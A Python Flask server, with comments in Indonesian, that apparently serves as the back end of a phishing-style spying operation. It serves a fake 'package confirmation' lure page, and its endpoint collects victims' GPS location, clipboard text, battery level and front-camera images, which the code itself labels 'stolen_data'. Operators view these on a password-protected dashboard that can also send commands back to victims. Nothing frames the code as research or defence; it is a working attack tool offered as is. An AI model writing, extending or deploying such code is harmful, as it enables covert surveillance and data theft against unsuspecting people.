import os
import base64
from flask import Flask, render_template, request, jsonify, session, redirect, url_for

app = Flask(__name__)
app.secret_key = "GEAR99_LAB_EXCLUSIVE_SECRET_KEY_99"

# Kredensial Akses Kontrol Panel Operator
USERNAME_ADMIN = "admin"
PASSWORD_ADMIN = "medusa123"

# =========================================================================
# LIVE STORAGE INDIKATOR DATA (MEMORI VPS)
# =========================================================================
latest_frame = None
device_details = "MENUNGGU KONEKSI NODE..."
telemetry_logs = ["[SYSTEM] Central proxy automation secure channel online."]
pending_commands = []

stolen_data = {
    "gps": "Belum menerima koordinat GPS.",
    "battery": "Unknown",
    "clipboard": "Belum ada input teks."
}

# --- ROUTING NAVIGASI HALAMAN ---

@app.route('/')
def index():
    return render_template('landing.html')

@app.route('/konfirmasi-paket')
def target_page():
    return render_template('target.html')

@app.route('/operator/dashboard')
def operator_dashboard():
    if not session.get("logged_in"):
        return render_template('login.html')
    return render_template('operator.html')

@app.route('/login', methods=['POST'])
def login():
    if request.form.get("user") == USERNAME_ADMIN and request.form.get("pass") == PASSWORD_ADMIN:
        session["logged_in"] = True
        return redirect(url_for("operator_dashboard"))
    return "Otorisasi Gagal. <a href='/operator/dashboard'>Coba Lagi</a>"

@app.route('/logout')
def logout():
    session.pop("logged_in", None)
    return redirect(url_for("operator_dashboard"))


# --- ENDPOINT API PENERIMA DATA TELEMETRI DARI NODE TARGET ---

@app.route('/api/submit-telemetry', methods=['POST'])
def submit_telemetry():
    global device_details, telemetry_logs, stolen_data, latest_frame
    data = request.json
    if not data:
        return jsonify({"status": "error", "message": "No data received"}), 400

    # 1. Update Spesifikasi Perangkat & Browser Asli
    if "device_info" in data:
        device_details = data["device_info"]
        telemetry_logs.append(f"[NODE_ACTIVE] Perangkat terhubung: {device_details}")

    # 2. Ambil Persentase Daya Baterai Hardware
    if "battery" in data:
        stolen_data["battery"] = str(data["battery"]) + "%"

    # 3. Tangkap Input Teks Tautan Alamat
    if "clipboard" in data:
        stolen_data["clipboard"] = data["clipboard"]

    # 4. Tangkap Titik Koordinat GPS / Geolocation Riil Browser
    if "gps" in data and data["gps"]:
        stolen_data["gps"] = data["gps"]
        telemetry_logs.append(f"[GPS_UPDATE] Koordinat satelit diterima: {data['gps']}")

    # 5. Tangkap Frame Visual Kamera Depan (Base64)
    if "frame" in data and data["frame"]:
        latest_frame = data["frame"]
        telemetry_logs.append("[MEDIA_CAPTURE] Aliran frame visual kamera berhasil dimuat ke dasbor.")

    return jsonify({"status": "success", "commands": pending_commands})


# --- ENDPOINT JALUR DATA OPERATOR ---

@app.route('/api/get-telemetry-log')
def get_telemetry_log():
    global telemetry_logs, device_details, stolen_data
    return jsonify({
        "details": device_details,
        "logs": telemetry_logs[-15:],
        "stolen_data": stolen_data
    })

@app.route('/api/get-latest-frame')
def get_latest_frame():
    global latest_frame
    if latest_frame:
        try:
            if "," in latest_frame:
                header, encoded = latest_frame.split(",", 1)
            else:
                encoded = latest_frame
            image_data = base64.b64decode(encoded)
            return image_data, 200, {'Content-Type': 'image/jpeg'}
        except Exception:
            return "", 204
    return "", 204

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
